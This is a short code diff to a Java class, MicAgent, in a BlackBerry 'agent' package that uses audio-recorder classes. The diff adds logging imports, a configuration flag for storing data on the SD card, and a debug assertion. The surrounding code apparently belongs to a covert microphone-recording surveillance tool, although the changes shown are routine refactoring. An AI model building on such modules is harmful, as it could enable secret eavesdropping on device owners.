@@ -10,8 +10,11 @@
 package blackberry.agent;
 
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Conf;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
+import blackberry.log.Log;
+import blackberry.log.LogType;
 import blackberry.record.AudioRecorder;
 import blackberry.record.AudioRecorderDispatcher;
 import blackberry.utils.Check;
@@ -45,8 +48,11 @@ public final class MicAgent extends Agent {
      *            the agent status
      */
     public MicAgent(final boolean agentStatus) {
-        super(Agent.AGENT_MIC, agentStatus, true, "MicAgent");
-
+        super(Agent.AGENT_MIC, agentStatus, Conf.AGENT_MIC_ON_SD, "MicAgent");
+        //#ifdef DBC
+        Check.asserts(Log.convertTypeLog(agentId) == LogType.MIC,
+                "Wrong Conversion");
+        //#endif
     }
 
     /**
